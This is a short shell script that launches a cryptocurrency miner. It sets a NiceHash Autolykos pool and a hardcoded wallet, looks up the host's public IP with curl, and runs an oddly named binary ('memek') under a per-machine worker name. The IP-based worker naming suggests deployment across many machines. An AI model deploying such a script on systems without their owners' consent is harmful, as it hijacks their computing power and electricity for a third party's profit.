POOL=stratum+tcp://autolykos.eu-west.nicehash.com:3390
WALLET=3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk
myip=$(/usr/bin/curl -s http://whatismyip.akamai.com)
r1=${myip/./_}
r2=${r1/./_}
r3=${r2/./_}
r4=${r3/./_}
WORKER=$(echo $(shuf -i 1-100000 -n 1)-P100)
name="${r4}_${WORKER}"
chmod +x memek
./memek --algo AUTOLYKOS2 --pool $POOL --user $WALLET.$name
